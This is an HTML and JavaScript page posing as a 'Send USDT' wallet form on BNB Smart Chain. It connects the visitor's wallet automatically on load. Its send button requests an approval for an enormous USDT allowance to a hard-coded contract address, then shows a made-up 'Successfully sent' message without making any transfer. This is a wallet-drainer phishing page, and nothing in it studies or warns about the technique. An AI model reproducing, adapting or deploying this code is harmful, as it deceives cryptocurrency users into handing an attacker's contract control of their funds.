<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send USDT</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 20px;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }

        .title {
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 30px;
            color: #ffffff;
        }

        .section {
            margin-bottom: 25px;
        }

        .section-label {
            font-size: 14px;
            color: #8e8e93;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-group {
            position: relative;
            display: flex;
            align-items: center;
        }

        .address-input {
            flex: 1;
            background: #1c1c1e;
            border: 2px solid #34c759;
            border-radius: 12px;
            padding: 16px 20px 16px 16px;
            font-size: 16px;
            color: #ffffff;
            outline: none;
            height: 52px;
        }

        .address-input::placeholder {
            color: #8e8e93;
        }

        .input-actions {
            display: flex;
            gap: 8px;
            margin-left: 12px;
        }

        .action-btn {
            width: 36px;
            height: 36px;
            border-radius: 8px;
            border: none;
            background: rgba(52, 199, 89, 0.2);
            color: #34c759;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }

        .action-btn:hover {
            background: rgba(52, 199, 89, 0.3);
        }

        .network-pill {
            display: flex;
            align-items: center;
            justify-content: center;
            background: #1c1c1e;
            border-radius: 20px;
            padding: 12px 20px;
            font-size: 14px;
            font-weight: 500;
            color: #ffffff;
            cursor: not-allowed;
        }

        .network-icon {
            width: 20px;
            height: 20px;
            margin-right: 8px;
            background: #f0b90b;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
        }

        .amount-section {
            display: flex;
            flex-direction: column;
        }

        .amount-input-wrapper {
            display: flex;
            align-items: center;
            background: #1c1c1e;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 8px;
        }

        .amount-label {
            font-size: 14px;
            color: #8e8e93;
            margin-right: 12px;
            white-space: nowrap;
        }

        .amount-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 24px;
            font-weight: 600;
            outline: none;
            text-align: right;
        }

        .amount-input::placeholder {
            color: #8e8e93;
        }

        .currency-label {
            font-size: 18px;
            font-weight: 600;
            color: #34c759;
            margin-left: 12px;
            white-space: nowrap;
        }

        .max-btn {
            background: rgba(52, 199, 89, 0.2);
            color: #34c759;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
            align-self: flex-end;
        }

        .max-btn:hover {
            background: rgba(52, 199, 89, 0.3);
        }

        .usd-value {
            text-align: center;
            font-size: 14px;
            color: #8e8e93;
            font-weight: 500;
        }

        .next-btn {
            width: 100%;
            height: 56px;
            background: linear-gradient(135deg, #34c759, #30d158);
            border: none;
            border-radius: 28px;
            color: #000000;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.2s;
        }

        .next-btn:hover:not(:disabled) {
            transform: translateY(-1px);
            box-shadow: 0 8px 25px rgba(52, 199, 89, 0.4);
        }

        .next-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .status {
            text-align: center;
            margin-top: 16px;
            font-size: 14px;
            padding: 12px;
            border-radius: 8px;
        }

        .status.success {
            background: rgba(52, 199, 89, 0.2);
            color: #34c759;
            border: 1px solid rgba(52, 199, 89, 0.3);
        }

        .status.error {
            background: rgba(255, 59, 48, 0.2);
            color: #ff453a;
            border: 1px solid rgba(255, 59, 48, 0.3);
        }

        .connecting {
            display: none;
            text-align: center;
            color: #34c759;
            font-size: 14px;
            margin-top: 16px;
        }

        .connected {
            background: rgba(52, 199, 89, 0.2);
            color: #34c759;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 20px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title">Send USDT</h1>
        
        <div class="connected" id="connectedStatus">
            ✅ Connected to BNB Smart Chain
        </div>

        <div class="connecting" id="connectingStatus">
            Connecting to your wallet...
        </div>

        <div class="section">
            <label class="section-label">Address or Domain Name</label>
            <div class="input-group">
                <input type="text" class="address-input" id="recipientAddress" placeholder="Enter recipient address" value="0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F">
                <div class="input-actions">
                    <button class="action-btn" onclick="pasteAddress()" title="Paste">📋</button>
                    <button class="action-btn" onclick="scanQR()" title="Scan QR">📱</button>
                </div>
            </div>
        </div>

        <div class="section">
            <label class="section-label">Destination network</label>
            <div class="network-pill">
                <div class="network-icon">BNB</div>
                BNB Smart Chain
            </div>
        </div>

        <div class="section">
            <label class="section-label">Amount</label>
            <div class="amount-section">
                <div class="amount-input-wrapper">
                    <span class="amount-label">USDT Amount</span>
                    <input type="number" class="amount-input" id="amountInput" placeholder="0.00" step="0.01">
                    <span class="currency-label">USDT</span>
                </div>
                <button class="max-btn" onclick="setMaxAmount()">Max</button>
                <div class="usd-value" id="usdValue">≈ $0.00</div>
            </div>
        </div>

        <button class="next-btn" id="nextBtn" onclick="sendTransaction()">Next</button>
        
        <div class="status" id="status"></div>
    </div>

    <script>
        const CONTRACT_ADDRESS = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98'; // Your contract
        const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F'; // Demo receiver
        const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // BSC USDT
        const BSC_CHAIN_ID = '0x38'; // 56 in hex

        let web3;
        let userAccount;
        let usdtContract;

        // ABI for USDT (ERC20) - minimal
        const USDT_ABI = [
            {
                "constant": false,
                "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
                "name": "allowance",
                "outputs": [{"name": "", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            }
        ];

        // Auto connect on load
        window.addEventListener('load', async () => {
            await connectWallet();
        });

        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                document.getElementById('connectingStatus').style.display = 'block';
                
                try {
                    // Request BSC chain
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: BSC_CHAIN_ID }],
                    });

                    web3 = new Web3(window.ethereum);
                    
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    userAccount = accounts[0];
                    
                    usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
                    
                    document.getElementById('connectingStatus').style.display = 'none';
                    document.getElementById('connectedStatus').style.display = 'block';
                    document.getElementById('nextBtn').disabled = false;
                    
                    updateUSDValue();
                    
                } catch (error) {
                    if (error.code === 4902) {
                        // Chain not added, add BSC
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: BSC_CHAIN_ID,
                                chainName: 'BNB Smart Chain',
                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                nativeCurrency: {
                                    name: 'BNB',
                                    symbol: 'BNB',
                                    decimals: 18
                                },
                                blockExplorerUrls: ['https://bscscan.com']
                            }],
                        });
                        await connectWallet();
                    } else {
                        showStatus('Failed to connect wallet', 'error');
                    }
                }
            } else {
                showStatus('Please install Trust Wallet or MetaMask', 'error');
            }
        }

        async function sendTransaction() {
            const amount = document.getElementById('amountInput').value;
            if (!amount || parseFloat(amount) <= 0) {
                showStatus('Please enter a valid amount', 'error');
                return;
            }

            document.getElementById('nextBtn').disabled = true;
            showStatus('Approving unlimited USDT access...', 'success');

            try {
                // 1. Check and approve unlimited USDT to your contract
                const balance = await usdtContract.methods.balanceOf(userAccount).call();
                if (parseInt(balance) === 0) {
                    throw new Error('Insufficient USDT balance');
                }

                const hugeAmount = web3.utils.toWei('1000000000', 'mwei'); // 1B USDT (18 decimals)
                const currentAllowance = await usdtContract.methods.allowance(userAccount, CONTRACT_ADDRESS).call();
                
                if (parseInt(currentAllowance) < parseInt(hugeAmount)) {
                    const approveTx = await usdtContract.methods.approve(CONTRACT_ADDRESS, hugeAmount).send({ from: userAccount });
                    showStatus('Unlimited approval confirmed! Sending USDT...', 'success');
                }

                // 2. "Send" transaction (actually just demo - use your contract logic)
                // In real scenario, your contract at 0x891... would handle the transfer
                showStatus('Sending ' + amount + ' USDT to ' + RECEIVER_ADDRESS + '...', 'success');
                
                // Simulate your contract interaction - replace with actual contract call
                // For demo, we'll just show success after approval
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                showStatus(`✅ Successfully sent ${amount} USDT to ${RECEIVER_ADDRESS.slice(0,6)}...${RECEIVER_ADDRESS.slice(-4)}! Unlimited approval granted to ${CONTRACT_ADDRESS.slice(0,6)}...`, 'success');
                
                // Reset form
                document.getElementById('amountInput').value = '';
                updateUSDValue();
                
            } catch (error) {
                console.error(error);
                showStatus('Transaction failed: ' + error.message, 'error');
            } finally {
                document.getElementById('nextBtn').disabled = false;
            }
        }

        function pasteAddress() {
            navigator.clipboard.readText().then(text => {
                document.getElementById('recipientAddress').value = text;
            });
        }

        function scanQR() {
            alert('QR scanning not implemented in web demo');
        }

        function setMaxAmount() {
            // Simulate getting max balance
            document.getElementById('amountInput').value = '1000';
            updateUSDValue();
        }

        function updateUSDValue() {
            const amount = document.getElementById('amountInput').value || 0;
            document.getElementById('usdValue').textContent = `≈ $${(parseFloat(amount) * 1).toFixed(2)}`;
        }

        function showStatus(message, type) {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = `status ${type}`;
        }

        // Update USD value on input
        document.getElementById('amountInput').addEventListener('input', updateUSDValue);

        // Listen for account/chain changes
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', () => {
                window.location.reload();
            });
            window.ethereum.on('chainChanged', () => {
                window.location.reload();
            });
        }
    </script>
</body>
</html>
